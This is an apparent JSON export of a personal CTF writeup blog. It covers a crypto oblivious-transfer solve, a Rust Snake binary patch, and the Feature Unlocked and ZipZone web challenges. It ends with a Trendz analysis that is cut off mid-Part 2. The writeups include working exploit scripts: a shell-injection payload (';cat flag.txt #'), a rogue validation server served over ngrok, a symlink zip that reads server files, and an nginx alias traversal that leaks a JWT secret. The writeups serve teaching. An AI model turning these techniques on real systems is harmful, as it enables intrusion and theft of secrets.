[{"content":" Patrioc CTF 2024 Description PatriotCTF is an online jeopardy-style CTF hosted by George Mason University\u0026rsquo;s Competitive Cyber Club. All are welcome to participate, including students and security professionals. Challenges will range from beginner to expert, so there should be something for everyone.\nUrl Discord Performance Summary CTFs: 32/65 Total points: 5308 Position: 63/1360 Rating points: 9.735 Writeups No writeups today\u0026hellip;\n","permalink":"http://localhost:1313/writeups/patriotctf2024/","title":"PatriotCTF 2024"},{"content":" m0leCon CTF 2025 Teaser Description m0leCon CTF 2025 Teaser is an online jeopardy-style CTF organized by pwnthem0le. Top 10 teams will be invited to the final event, that will take place in Spring 2025 at Politecnico di Torino.\nUrl Discord Performance Summary CTFs: 1/18 Total points: 100 Position: 71/500 Rating points: 2.920 Writeups Crypto Yet Another OT ","permalink":"http://localhost:1313/writeups/m0lecon2025teaser/","title":"m0leCon CTF 2025 Teaser"},{"content":"Yet Another OT Description: Why do people always want to decrypt both messages?\nDisclaimer I wasn\u0026rsquo;t able to solve this challenge during the competition, but managed to get to the solution after talking on discord to other competitors who very kindly helped me figure it out.\nIntroduction Yet Another OT was a crypto CTF from m0leCon 2025 hosted by pwnthem0le.\nimport random from hashlib import sha256 import json import os from Crypto.Cipher import AES from Crypto.Util.Padding import pad random = random.SystemRandom() def jacobi(a, n): if n \u0026lt;= 0: raise ValueError(\u0026quot;'n' must be a positive integer.\u0026quot;) if n % 2 == 0: raise ValueError(\u0026quot;'n' must be odd.\u0026quot;) a %= n result = 1 while a != 0: while a % 2 == 0: a //= 2 n_mod_8 = n % 8 if n_mod_8 in (3, 5): result = -result a, n = n, a if a % 4 == 3 and n % 4 == 3: result = -result a %= n if n == 1: return result else: return 0 def sample(start, N): while jacobi(start, N) != 1: start += 1 return start class Challenge: def __init__(self, N): assert N \u0026gt; 2**1024 assert N % 2 != 0 self.N = N self.x = sample(int.from_bytes(sha256((\u0026quot;x\u0026quot;+str(N)).encode()).digest(), \u0026quot;big\u0026quot;), N) ts = [] tts = [] for _ in range(128): t = random.randint(1, self.N) ts.append(t) tts.append(pow(t, N, N)) print(json.dumps({\u0026quot;vals\u0026quot;: tts})) self.key = sha256((\u0026quot;,\u0026quot;.join(map(str, ts))).encode()).digest() def one_round(self): z = sample(random.randint(1, self.N), self.N) r0 = random.randint(1, self.N) r1 = random.randint(1, self.N) m0, m1 = random.getrandbits(1), random.getrandbits(1) c0 = (r0**2 * (z)**m0) % self.N c1 = (r1**2 * (z*self.x)**m1) % self.N print(json.dumps({\u0026quot;c0\u0026quot;: c0, \u0026quot;c1\u0026quot;: c1})) data = json.loads(input()) v0, v1 = data[\u0026quot;m0\u0026quot;], data[\u0026quot;m1\u0026quot;] return v0 == m0 and v1 == m1 def send_flag(self, flag): cipher = AES.new(self.key, AES.MODE_ECB) ct = cipher.encrypt(pad(flag.encode(), 16)) print(ct.hex()) FLAG = os.environ.get(\u0026quot;FLAG\u0026quot;, \u0026quot;ptm{test}\u0026quot;) def main(): print(\u0026quot;Welcome to my guessing game!\u0026quot;) N = int(input(\u0026quot;Send me a number: \u0026quot;)) chall = Challenge(N) for _ in range(128): if not chall.one_round(): exit(1) chall.send_flag(FLAG) if __name__ == \u0026quot;__main__\u0026quot;: main() We can remotely interact with this service to recover the flag.\nAnalysis Let\u0026rsquo;s start with the functions: jacobi(a, n) computes the Jacobi symbol of a mod n\nsample(start, N) returns the first s \u0026gt;= start such that sample(s, N) == 1\nLet\u0026rsquo;s look at the class Challenge now: __init__(self, N)\nN is checked to be odd and greater than $2^{1024}$ self.x is generated from sample(int.from_bytes(sha256((\u0026quot;x\u0026quot;+str(N)).encode()).digest(), \u0026quot;big\u0026quot;), N) A loop generates 128 random private values ts and their public counterpart tts self.key is generated from sha256((\u0026quot;,\u0026quot;.join(map(str, ts))).encode()).digest() one_round(self)\nz is generated from sample(random.randint(1, self.N), self.N) r0, r1 are random integers in the range $[1, N]$ m0, m1 are randomly chosen from $\\{0, 1\\}$ $c_0 \\equiv r_0^2 \\cdot z^{m_0} \\pmod N$ $c_1 \\equiv r_1^2 \\cdot (z \\cdot x)^{m_1} \\pmod N$ c0, c1 are shared and the user has to correctly guess m0, m1 to continue to the next round send_flag(self, flag)\nencrypts the flag with AES using self.key and sends it to the user Solution The first objective is retrieving the AES key, so from each pow(t, N, N) I had to get t. My idea was to use Fermat\u0026rsquo;s little theorem, therefore setting N to be prime would make it so tts == ts. This allows easy recovery of self.key but it\u0026rsquo;s also a grave mistake\u0026hellip; The second objective is guessing m0 and m1 128 times in a row to finally get the encrypted flag and decrypt it with our key. The idea is to use theory about quadratic residues, but this is where I got stuck: if N is prime this is actually impossible as sample will always generate a correct quadratic residue and therefore these two cases are indistinguishable\n$$ \\begin{cases} c_0 \\equiv r_0^2 \\cdot z \\pmod N \\\\ c_0 \\equiv r_0^2 \\pmod N \\end{cases} $$After the end of the CTF I asked on discord for help on figuring out where I went wrong and some competitors who solved it kindly explained it to me. The idea is to use a different value for N. Recovering the private key requires \u0026ldquo;decrypting\u0026rdquo; the public values which are encrypted using the usual RSA method, we expect this to be hard without knowing the factorization of N, but as we\u0026rsquo;re the ones to choose it we can simply generate some primes, take their product and decrypting is easy as we have the factorization of N. Now that N is composite sample won\u0026rsquo;t always generate quadratic residues mod N (there is still a possibility but it\u0026rsquo;s low enough to be ignored) so as soon as the Legendre symbol of c0 for any of the prime factors of N isn\u0026rsquo;t 1 we know we must be in the case where m0 == 1 (same goes for c1and m1). After 128 rounds we are given the encrypted flag which we can just decrypt as we have the key.\nfrom Pwn4Sage.pwn import * from Crypto.Cipher import AES from Crypto.Util.Padding import unpad import json, hashlib r = remote('yaot.challs.m0lecon.it', 2844) primes = [random_prime(2^(32), lbound=2^31) for _ in range(33)] N = prod(primes) assert N \u0026gt; 2^1024 phi = prod([p - 1 for p in primes]) d = inverse_mod(N, phi) # Pwn4Sage doesn't have sendlineafter r.sendafter(b'number: ', str(N).encode() + b'\\n') tts = json.loads(r.recvline().rstrip())['vals'] ts = [pow(tt, d, N) for tt in tts] key = hashlib.sha256((\u0026quot;,\u0026quot;.join(map(str, ts))).encode()).digest() for _ in range(128): data = json.loads(r.recvline().rstrip()) c0, c1 = data['c0'], data['c1'] m0 = int(any(legendre_symbol(c0, p) != 1 for p in primes)) m1 = int(any(legendre_symbol(c1, p) != 1 for p in primes)) payload = json.dumps({'m0': m0, 'm1': m1}).encode() r.sendline(payload) enc_flag = bytes.fromhex(r.recvline().rstrip().decode()) cipher = AES.new(key, AES.MODE_ECB) flag = unpad(cipher.decrypt(enc_flag), 16).decode() print('flag:', flag) $ flag: ptm{t0_b3_0r_n07_t0_b3_4_qu4dr471c_r351du3?} Author: vympel\n","permalink":"http://localhost:1313/writeups/m0lecon2025teaser/yetanotherot/","title":"Yet Another OT"},{"content":"Snake Description: Can you slither to the win?\nLink to the binary: Elf file\nIntroduction We are faced with a binary file written in Rust (you can see it by simply running strings snake | grep rustc) where we are made to play Snake, the goal is to get PRECISELY to 16525 points.\nSolution The solutions were actually different, some people used tools to analyze the memory of a process in real time, I preferred a \u0026lsquo;slower\u0026rsquo; approach, or rather the first thing that came to mind, so I opened binary ninja despite the file being stripped and looked for a value for constant exactly 0xa (i.e. the value that was added every time it ate a #).\nIn a short time I managed to find this:\nAfter some trial and error, changing the value from 0xa to 0xb, I find the line of code I need, which is the last one in the screenshot above.\nAt this point I switch to the assembly and notice that my initial approach was wrong this is because I was putting too high a value in a register that it did not support in fact analysing the binary in assembly we see:\nAs we can see, before entering the constant into the dword register [rcx+0x7c], we first enter it into eax and if we enter too high a value, the programme simply crashes (as it should).\nSo simply afterwards I chose to put the precise value in the correct register once I had made at least one point\n(the nop are automatically inserted by binary ninja)\nIn this way, once we have scored at least one point, we will have the flag\n$ flag: CSCTF{Y0u_b34T_My_Sl1th3r_G4m3!} Author: akiidjk ","permalink":"http://localhost:1313/writeups/cyberspace2024/snake/","title":"Snake"},{"content":"Feature unlocked Description: The world\u0026rsquo;s coolest app has a brand new feature! Too bad it\u0026rsquo;s not released until after the CTF..\nLink: https://feature-unlocked-web-challs.csc.tf/\nIntroduction Feature unlocked is part of the first wave of the web and is one of the first challanges I solved. Made by cryptocat, who we salute, it is a fairly simple challange if you read the code correctly.\nSource # filename: main.py import subprocess import base64 import json import time import requests import os from flask import Flask, request, render_template, make_response, redirect, url_for from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS from itsdangerous import URLSafeTimedSerializer app = Flask(__name__) app.secret_key = os.urandom(16) serializer = URLSafeTimedSerializer(app.secret_key) DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338' NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60 DEFAULT_PREFERENCES = base64.b64encode(json.dumps({ 'theme': 'light', 'language': 'en' }).encode()).decode() def get_preferences(): preferences = request.cookies.get('preferences') if not preferences: response = make_response(render_template( 'index.html', new_feature=False)) response.set_cookie('preferences', DEFAULT_PREFERENCES) return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response return json.loads(base64.b64decode(preferences)), None @app.route('/') def index(): _, response = get_preferences() return response if response else render_template('index.html', new_feature=False) @app.route('/release') def release(): token = request.cookies.get('access_token') if token: try: data = serializer.loads(token) if data == 'access_granted': return redirect(url_for('feature')) except Exception as e: print(f\u0026quot;Token validation error: {e}\u0026quot;) validation_server = DEFAULT_VALIDATION_SERVER if request.args.get('debug') == 'true': preferences, _ = get_preferences() validation_server = preferences.get( 'validation_server', DEFAULT_VALIDATION_SERVER) if validate_server(validation_server): response = make_response(render_template( 'release.html', feature_unlocked=True)) token = serializer.dumps('access_granted') response.set_cookie('access_token', token, httponly=True, secure=True) return response return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE) @app.route('/feature', methods=['GET', 'POST']) def feature(): token = request.cookies.get('access_token') if not token: return redirect(url_for('index')) try: data = serializer.loads(token) if data != 'access_granted': return redirect(url_for('index')) if request.method == 'POST': to_process = request.form.get('text') try: word_count = f\u0026quot;echo {to_process} | wc -w\u0026quot; output = subprocess.check_output( word_count, shell=True, text=True) except subprocess.CalledProcessError as e: output = f\u0026quot;Error: {e}\u0026quot; return render_template('feature.html', output=output) return render_template('feature.html') except Exception as e: print(f\u0026quot;Error: {e}\u0026quot;) return redirect(url_for('index')) def get_pubkey(validation_server): try: response = requests.get(f\u0026quot;{validation_server}/pubkey\u0026quot;) response.raise_for_status() return ECC.import_key(response.text) except requests.RequestException as e: raise Exception( f\u0026quot;Error connecting to validation server for public key: {e}\u0026quot;) def validate_access(validation_server): pubkey = get_pubkey(validation_server) try: response = requests.get(validation_server) response.raise_for_status() data = response.json() date = data['date'].encode('utf-8') signature = bytes.fromhex(data['signature']) verifier = DSS.new(pubkey, 'fips-186-3') verifier.verify(SHA256.new(date), signature) return int(date) except requests.RequestException as e: raise Exception(f\u0026quot;Error validating access: {e}\u0026quot;) def validate_server(validation_server): try: date = validate_access(validation_server) return date \u0026gt;= NEW_FEATURE_RELEASE except Exception as e: print(f\u0026quot;Error: {e}\u0026quot;) return False if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) # filename: validation.py from flask import Flask, jsonify import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) key = ECC.generate(curve='p256') pubkey = key.public_key().export_key(format='PEM') @app.route('/pubkey', methods=['GET']) def get_pubkey(): return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'} @app.route('/', methods=['GET']) def index(): date = str(int(time.time())) h = SHA256.new(date.encode('utf-8')) signature = DSS.new(key, 'fips-186-3').sign(h) return jsonify({ 'date': date, 'signature': signature.hex() }) if __name__ == '__main__': app.run(host='127.0.0.1', port=1338) The application is divided into two parts: the main one, where we find the web application, and a server used to validate the access token with the access_garantied parameter for the release of the feature.\nOne thing that immediately stands out is a part of the main code where a debug mode is given.\nif request.args.get('debug') == 'true': preferences, _ = get_preferences() validation_server = preferences.get( 'validation_server', DEFAULT_VALIDATION_SERVER) If the get arguments have the debug=true option, it will take the validation server from our preferences, which we remember to be a simple base64 cookie from a json so easily replicable.\nSolution What we can do is give the application its own validation server, which is simply a copy of our own, except that we can change the date of the server to make the feature.\n# filename: evil_validation.py from flask import Flask, jsonify import time from Crypto.Hash import SHA256 from Crypto.PublicKey import ECC from Crypto.Signature import DSS app = Flask(__name__) key = ECC.generate(curve='p256') pubkey = key.public_key().export_key(format='PEM') @app.route('/pubkey', methods=['GET']) def get_pubkey(): print(\u0026quot;Pubkey: \u0026quot; + pubkey) return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'} @app.route('/', methods=['GET']) def index(): date = str(int(time.time()) + 7 * 24 * 60 * 60) h = SHA256.new(date.encode('utf-8')) signature = DSS.new(key, 'fips-186-3').sign(h) print(\u0026quot;Date: \u0026quot; + date) print(\u0026quot;Signature: \u0026quot; + signature.hex()) print(\u0026quot;Validating signature...\u0026quot;) print(jsonify({ 'date': date, 'signature': signature.hex() })) return jsonify({ 'date': date, 'signature': signature.hex() }) if __name__ == '__main__': app.run(host='127.0.0.1', port=1338) # filename: exploit.py #!/usr/bin/python3 import base64 import requests import json from bs4 import BeautifulSoup BASE_URL = \u0026quot;https://feature-unlocked-web-challs.csc.tf\u0026quot; URL_HOOK = \u0026quot;https://3fcb-79-33-159-173.ngrok-free.app\u0026quot; # ngrok tunnel with evil_validation.py in listening (so run python3 evil_validation; ngrok http 1338 ) s = requests.Session() def get_validation(): preference = base64.b64encode(json.dumps({ 'theme': 'light', 'language': 'en', 'validation_server': URL_HOOK }).encode()).decode() r = s.get(f\u0026quot;{BASE_URL}/release\u0026quot;, params={\u0026quot;debug\u0026quot;: \u0026quot;true\u0026quot;}, cookies={\u0026quot;preferences\u0026quot;: preference}) print(f\u0026quot;{s.cookies=}\u0026quot;) def get_flag(): payload = ';cat flag.txt #' # Bypass for word_count = f\u0026quot;echo {to_process} | wc -w\u0026quot; r = s.post(f\u0026quot;{BASE_URL}/feature\u0026quot;,data={\u0026quot;text\u0026quot;:payload}) soup = BeautifulSoup(r.text, 'html.parser') print(\u0026quot;Flag: \u0026quot; + (soup.find('pre').text).strip()) def main(): get_validation() get_flag() if __name__ == \u0026quot;__main__\u0026quot;: main() # goodluck by @akiidjk $ flag: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!} Author: akiidjk ","permalink":"http://localhost:1313/writeups/cyberspace2024/feature_unlocked/","title":"Feature Unlocked"},{"content":"Zipzone Description: I was tired of trying to find a good file server for zip files, so I made my own! It\u0026rsquo;s still a work in progress, but I think it\u0026rsquo;s pretty good so far.\nLink: https://zipzone-web.challs.csc.tf/\nIntroduction ZipZone is the only one web in the beginner\u0026rsquo;s category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.\nSource # filename: app.py import logging import os import subprocess import uuid from flask import ( Flask, abort, flash, redirect, render_template, request, send_from_directory, ) app = Flask(__name__) upload_dir = \u0026quot;/tmp/\u0026quot; app.config[\u0026quot;MAX_CONTENT_LENGTH\u0026quot;] = 1 * 10**6 # 1 MB app.config[\u0026quot;SECRET_KEY\u0026quot;] = os.urandom(32) @app.route(\u0026quot;/\u0026quot;, methods=[\u0026quot;GET\u0026quot;, \u0026quot;POST\u0026quot;]) def upload(): if request.method == \u0026quot;GET\u0026quot;: return render_template(\u0026quot;index.html\u0026quot;) if \u0026quot;file\u0026quot; not in request.files: flash(\u0026quot;No file part!\u0026quot;, \u0026quot;danger\u0026quot;) return render_template(\u0026quot;index.html\u0026quot;) file = request.files[\u0026quot;file\u0026quot;] if file.filename.split(\u0026quot;.\u0026quot;)[-1].lower() != \u0026quot;zip\u0026quot;: flash(\u0026quot;Only zip files allowed are allowed!\u0026quot;, \u0026quot;danger\u0026quot;) return render_template(\u0026quot;index.html\u0026quot;) upload_uuid = str(uuid.uuid4()) filename = f\u0026quot;{upload_dir}raw/{upload_uuid}.zip\u0026quot; file.save(filename) subprocess.call([\u0026quot;unzip\u0026quot;, filename, \u0026quot;-d\u0026quot;, f\u0026quot;{upload_dir}files/{upload_uuid}\u0026quot;]) print(f\u0026quot;Unzipped {filename} to {upload_dir}files/{upload_uuid}\u0026quot;) flash( f'Your file is at \u0026lt;a href=\u0026quot;/files/{upload_uuid}\u0026quot;\u0026gt;{upload_uuid}\u0026lt;/a\u0026gt;!', \u0026quot;success\u0026quot; ) logging.info(f\u0026quot;User uploaded file {upload_uuid}.\u0026quot;) return redirect(\u0026quot;/\u0026quot;) @app.route(\u0026quot;/files/\u0026lt;path:path\u0026gt;\u0026quot;) def files(path): try: return send_from_directory(upload_dir + \u0026quot;files\u0026quot;, path) except PermissionError: abort(404) @app.errorhandler(404) def page_not_found(error): return render_template(\u0026quot;404.html\u0026quot;) if __name__ == \u0026quot;__main__\u0026quot;: app.run(debug=True, host=\u0026quot;0.0.0.0\u0026quot;, port=5000) Solution Being actually a web in the beginner category, I initially just gave a quick read to the source code, where in fact no checks are done on the files inside the zipper, but only on the zipper itself, where we see the extension is checked\n# filename: exploit.py #!/usr/bin/python3 import os import subprocess import requests from bs4 import BeautifulSoup BASE_URL = \u0026quot;https://zipzone-web.challs.csc.tf\u0026quot; URL_HOOK = \u0026quot;\u0026quot; def get_uuid(text): soup = BeautifulSoup(text, 'html.parser') for a in soup.find_all('a', href=True): if a['href']: return a['href'].split('/')[-1] def upload_file(file_path): with open(file_path, \u0026quot;rb\u0026quot;) as f: files = {\u0026quot;file\u0026quot;: f} response = requests.post(BASE_URL, files=files) return get_uuid(response.text) def create_exploit(zip_filename:str,symlink_name:str,symlink_target:str): os.symlink(symlink_target, symlink_name) subprocess.run(['zip', '-y', zip_filename, symlink_name], check=True) print(f'{zip_filename} created.') os.remove(symlink_name) def get_flag(UUID): response = requests.get(f'{BASE_URL}/files/{UUID}/evil_link',stream=True) if response.status_code == 200: with open(\u0026quot;flag\u0026quot;, 'wb') as f: for chunk in response.iter_content(chunk_size=8192): f.write(chunk) print(f\u0026quot;Flag download successfully\u0026quot;) else: print(f\u0026quot;Error during the download: {response.status_code}\u0026quot;) return open(\u0026quot;flag\u0026quot;, \u0026quot;r\u0026quot;).read().strip() def clean(): os.remove('exploit.zip') os.remove('flag') def main(): create_exploit(zip_filename='exploit.zip',symlink_name='evil_link',symlink_target='/home/user/flag.txt') UUID = upload_file('./exploit.zip') print(f'UUID: {UUID}') flag = get_flag(UUID) print(f\u0026quot;Flag: {flag}\u0026quot;) clean() if __name__ == \u0026quot;__main__\u0026quot;: main() # goodluck by @akiidjk The solutions is very simple, A symlink is simply created pointing to /home/user/flag, it is then zipped and sent to the page, we save the file id and in the path uuid/name_file we send the file pointing to the symlink.\n$ flag: CSCTF{5yml1nk5_4r3_w31rd} Author: akiidjk ","permalink":"http://localhost:1313/writeups/cyberspace2024/zipzone/","title":"ZipZone"},{"content":"Trendz (part 1 \u0026 2) Preamble This challenge is divided into four parts, three webs and a reverse. I\u0026rsquo;m excited to share that I managed to solve the first two webs! I\u0026rsquo;ll insert them all in a write-up, trying to explain them in the way the author thought. I admit I did not solve them in order, but I\u0026rsquo;m eager to see how they fit together. The application was written in Go using templates and a JWT authentication, and it\u0026rsquo;s write well! The application itself has many files, but they are well written and ordered, so a thorough analysis is not difficult but necessary. The application is divided into 5 basic parts.\nConfig file: ngix.conf ,run.sh,init.sql, dockerfile and .dockerignore Main go file: main.go This is where you\u0026rsquo;ll find all the details about how to use the different functions and what they do! Dashboard: Here are the 3 types of dashboards possible in the application Jwt handler: How to use JWT for authentication. Service: The various services such as post creation or user validation Application flow The basic application is presented with a login/registration screen where once we are logged in we are assigned an accesstoken and a refreshtoken, a redirect to the standard user dashboard occurs where we can create posts and view them via /posts/post-id,basically more than this we cannot do\nPath structure As mentioned before in the main.go we find the path declaration and some very important initialization functions\n// filename: main.go func main() { s := gin.Default() s.LoadHTMLGlob(\u0026quot;templates/*\u0026quot;) db.InitDBconn() jwt.InitJWT() // Initialization of jwt we will analyze it later s.GET(\u0026quot;/\u0026quot;, func(c *gin.Context) { c.Redirect(302, \u0026quot;/login\u0026quot;) }) s.GET(\u0026quot;/ping\u0026quot;, func(c *gin.Context) { c.JSON(200, gin.H{ \u0026quot;message\u0026quot;: \u0026quot;pong\u0026quot;, }) }) r := s.Group(\u0026quot;/\u0026quot;) r.POST(\u0026quot;/register\u0026quot;, service.CreateUser) r.GET(\u0026quot;/register\u0026quot;, func(c *gin.Context) { c.HTML(200, \u0026quot;register.tmpl\u0026quot;, gin.H{}) }) r.POST(\u0026quot;/login\u0026quot;, service.LoginUser) r.GET(\u0026quot;/login\u0026quot;, func(c *gin.Context) { c.HTML(200, \u0026quot;login.tmpl\u0026quot;, gin.H{}) }) r.GET(\u0026quot;/getAccessToken\u0026quot;, service.GenerateAccessToken) authorizedEndpoints := r.Group(\u0026quot;/user\u0026quot;) authorizedEndpoints.Use(service.AuthorizeAccessToken()) authorizedEndpoints.GET(\u0026quot;/dashboard\u0026quot;, dashboard.UserDashboard) authorizedEndpoints.POST(\u0026quot;/posts/create\u0026quot;, service.CreatePost) authorizedEndpoints.GET(\u0026quot;/posts/:postid\u0026quot;, service.ShowPost) authorizedEndpoints.GET(\u0026quot;/flag\u0026quot;, service.DisplayFlag) adminEndpoints := r.Group(\u0026quot;/admin\u0026quot;) adminEndpoints.Use(service.AuthorizeAccessToken()) adminEndpoints.Use(service.ValidateAdmin()) adminEndpoints.GET(\u0026quot;/dashboard\u0026quot;, dashboard.AdminDashboard) SAEndpoints := r.Group(\u0026quot;/superadmin\u0026quot;) SAEndpoints.Use(service.AuthorizeAccessToken()) SAEndpoints.Use(service.ValidateAdmin()) SAEndpoints.Use(service.AuthorizeRefreshToken()) SAEndpoints.Use(service.ValidateSuperAdmin()) SAEndpoints.GET(\u0026quot;/viewpost/:postid\u0026quot;, dashboard.ViewPosts) SAEndpoints.GET(\u0026quot;/dashboard\u0026quot;, dashboard.SuperAdminDashboard) s.NoRoute(custom.Custom404Handler) s.Run(\u0026quot;:8000\u0026quot;) } As it is seen the scheme of the paths is very clear and it is well done basically we have the login and registration and then we move to a division by role where we have a user section an admin and a superadmin each of them with their own validation services\nConfig files # filename: run.sh #!/bin/env sh cat /dev/urandom | head | sha1sum | cut -d \u0026quot; \u0026quot; -f 1 \u0026gt; /app/jwt.secret export JWT_SECRET_KEY=notsosecurekey export ADMIN_FLAG=CSCTF{flag1} export POST_FLAG=CSCTF{flag2} export SUPERADMIN_FLAG=CSCTF{flag3} export REV_FLAG=CSCTF{flag4} export POSTGRES_USER=postgres export POSTGRES_PASSWORD=mysecretpassword export POSTGRES_DB=devdb uuid=$(cat /proc/sys/kernel/random/uuid) user=$(cat /dev/urandom | head | md5sum | cut -d \u0026quot; \u0026quot; -f 1) cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /docker-entrypoint-initdb.d/init.sql INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin'); INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG'); EOF docker-ensure-initdb.sh \u0026amp; GIN_MODE=release /app/chall \u0026amp; sleep 5 su postgres -c \u0026quot;postgres -D /var/lib/postgresql/data\u0026quot; \u0026amp; nginx -g 'daemon off;' This file is actually very important because it gives us an idea of where the flags are (which fortunately are also numbered)\nAs we see the first thing that is done is to create a file called jwt.secret that will be a source of interest later,\nWe see that another jwt secret is initialized and 4 flags in 4 different environment variables,\nQueries are made one in which the superadmin user is created and another in which the flag is inserted in a record in the posts table\nFinally, the postgree database and the ngix server are started.\nuser nobody; worker_processes auto; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { proxy_pass http://localhost:8000; } location /static { alias /app/static/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } This is the ngix configuration, where a fairly standard configuration is written, except for declaring a /static alias.\nWell, once I\u0026rsquo;ve finished presenting the application, I\u0026rsquo;d say you\u0026rsquo;re ready to go\u0026hellip;\nTrendz Part 1 Description: The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\nNote: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you\u0026rsquo;ve completed this initial task, and will be released in Wave 3.\nIntroduction Well, as we saw in the run.sh file, the first flag is inside a record in the post table and it is also called ADMIN_FLAG, so the first thing to see is how admin authentication works and what the admin dashboard can do.\nSource // filename: AdminDash.go package dashboard import ( \u0026quot;app/handlers/service\u0026quot; \u0026quot;os\u0026quot; \u0026quot;github.com/gin-gonic/gin\u0026quot; ) func AdminDashboard(ctx *gin.Context) { posts := service.GetAllPosts() ctx.HTML(200, \u0026quot;adminDash.tmpl\u0026quot;, gin.H{ \u0026quot;flag\u0026quot;: os.Getenv(\u0026quot;ADMIN_FLAG\u0026quot;), \u0026quot;posts\u0026quot;: posts, }) } As we can see, the dashboard is very concise, we simply see that the GetAllPosts() function is called and then they are sent to the template, so not much to do here, let\u0026rsquo;s move on to how the admin is authenticated.\n//filename: main.go adminEndpoints := r.Group(\u0026quot;/admin\u0026quot;) adminEndpoints.Use(service.AuthorizeAccessToken()) adminEndpoints.Use(service.ValidateAdmin()) adminEndpoints.GET(\u0026quot;/dashboard\u0026quot;, dashboard.AdminDashboard) As we can see from the code, whenever we try to connect to the admin dashboard, it first runs two functions, ValidateAccess() and ValidateAdmin().\n//filename: JWTHandler.go func AuthorizeAccessToken() gin.HandlerFunc { return func(c *gin.Context) { c.Header(\u0026quot;X-Frame-Options\u0026quot;, \u0026quot;DENY\u0026quot;) c.Header(\u0026quot;X-XSS-Protection\u0026quot;, \u0026quot;1; mode=block\u0026quot;) const bearerSchema = \u0026quot;Bearer \u0026quot; var tokenDetected bool = false var tokenString string authHeader := c.GetHeader(\u0026quot;Authorization\u0026quot;) if len(authHeader) != 0 { tokenDetected = true tokenString = authHeader[len(bearerSchema):] } if !tokenDetected { var err error tokenString, err = c.Cookie(\u0026quot;accesstoken\u0026quot;) if tokenString == \u0026quot;\u0026quot; || err != nil { c.Redirect(302, \u0026quot;/getAccessToken?redirect=\u0026quot;+c.Request.URL.Path) } } fmt.Println(tokenString) token, err := jwt.ValidateAccessToken(tokenString) if err != nil { fmt.Println(err) c.AbortWithStatus(403) } if token.Valid { claims := jwt.GetClaims(token) fmt.Println(claims) c.Set(\u0026quot;username\u0026quot;, claims[\u0026quot;username\u0026quot;]) c.Set(\u0026quot;role\u0026quot;, claims[\u0026quot;role\u0026quot;]) } else { fmt.Println(\u0026quot;Token is not valid\u0026quot;) c.Header(\u0026quot;HX-Redirect\u0026quot;, \u0026quot;/getAccessToken\u0026quot;) c.AbortWithStatus(403) } } } This is a pretty standard function regarding JWT integrity checking, in fact here we see that the function checks that the cookie is well formatted and has no problems by validating it with the ValidateAccessToken() function, otherwise it rejects it or aborts the operation.\n//filename: JWTAuth.go func ValidateAccessToken(encodedToken string) (*jwt.Token, error) { return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) { _, isValid := token.Method.(*jwt.SigningMethodHMAC) if !isValid { return nil, fmt.Errorf(\u0026quot;invalid token with signing method: %v\u0026quot;, token.Header[\u0026quot;alg\u0026quot;]) } return []byte(secretKey), nil }) } // The function is safe and it is not subject to `alg:none` or any other kind of attack, so we must move on. //filename: ValidateAdmin.go func ValidateAdmin() gin.HandlerFunc { return func(c *gin.Context) { const bearerSchema = \u0026quot;Bearer \u0026quot; var tokenDetected bool = false var tokenString string authHeader := c.GetHeader(\u0026quot;Authorization\u0026quot;) if len(authHeader) != 0 { tokenDetected = true tokenString = authHeader[len(bearerSchema):] } if !tokenDetected { var err error tokenString, err = c.Cookie(\u0026quot;accesstoken\u0026quot;) if tokenString == \u0026quot;\u0026quot; || err != nil { c.Redirect(302, \u0026quot;/getAccessToken?redirect=\u0026quot;+c.Request.URL.Path) } } fmt.Println(tokenString) claims := jwt.ExtractClaims(tokenString) if claims[\u0026quot;role\u0026quot;] == \u0026quot;admin\u0026quot; || claims[\u0026quot;role\u0026quot;] == \u0026quot;superadmin\u0026quot; { fmt.Println(claims) } else { fmt.Println(\u0026quot;Token is not valid\u0026quot;) c.AbortWithStatusJSON(403, gin.H{\u0026quot;error\u0026quot;: \u0026quot;User Unauthorized\u0026quot;}) return } } } Instead, we see here that the role is validated in the JWT by checking that it is at least admin or superadmin.\nSolution Mmm authentication seems secure let\u0026rsquo;s take a step back and go to the JWTInit function.\n//filename: JWTAuth.go func InitJWT() { key, err := os.ReadFile(\u0026quot;jwt.secret\u0026quot;) if err != nil { panic(err) } secretKey = key[:] fmt.Printf(\u0026quot;JWT initialized %v\\n\u0026quot;, secretKey) } We see that the function itself doesn\u0026rsquo;t do much simply takes the key with which it will sign jwt\u0026rsquo;s from a file well known to us in fact we have seen it in run.sh where it is created and where a secure value is put there\nBut if we analyse the Docker file system locally, we see that jwt.secret is located in the same folder as static, which we saw in the ngix configuration create an alias to that path.\nlocation /static { alias /app/static/; } If we try to access /static we can see.\nNOTHING\u0026hellip; But we can wander around a bit for js and css files that we don\u0026rsquo;t need though, And if we try a class ../ after static we see that it doesn\u0026rsquo;t find anything there\nHmm will there be a way to bypass the ngix and access the file?\nWell actually yes because the configuration as we see on hacktricks is insecure and easily bypassed like this\nAnd if we try to type /static../jwt.secret\u0026hellip; NICE WE GOT THE JWT SECRET\nNow just change the role of the jwt and re-sign it but we\u0026rsquo;ll see that later in detail being that the challenge itself is solved\u0026hellip; (At the end see the #PS)\nTrendz Part 2 Descripion: Staying active has its rewards. There\u0026rsquo;s a special gift waiting for you, but it\u0026rsquo;s only available once you\u0026rsquo;ve made more 